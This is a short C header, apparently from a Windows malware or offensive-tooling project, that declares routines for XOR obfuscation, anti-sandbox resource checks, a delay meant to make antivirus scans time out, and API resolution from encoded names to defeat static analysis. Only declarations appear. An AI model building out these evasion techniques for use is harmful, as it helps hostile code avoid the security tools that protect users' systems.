#ifndef EVASION_H
#define EVASION_H

#include <stddef.h>
#include <windows.h> 
#include <stdbool.h>

// cypher/decypher data with XOR
void xor_crypt(char *data, size_t data_len, const char *key, size_t key_len);

// --- ANTI-SANDBOX ---

// check machine resources (RAM and cores)
bool check_resources();

// execute complex calculations to make the AV timeout.
void smart_delay();

// --- ANTI-STATIC ANALYSIS (Dynamic API resolution)

// takes encoded DLL and function data, decode them,
// finds function address, encode it and return a generic pointer (FARPROC)
FARPROC resolve_api(char* enc_dll, size_t dll_len, char* enc_func, size_t func_len, const char* key, size_t key_len);

#endif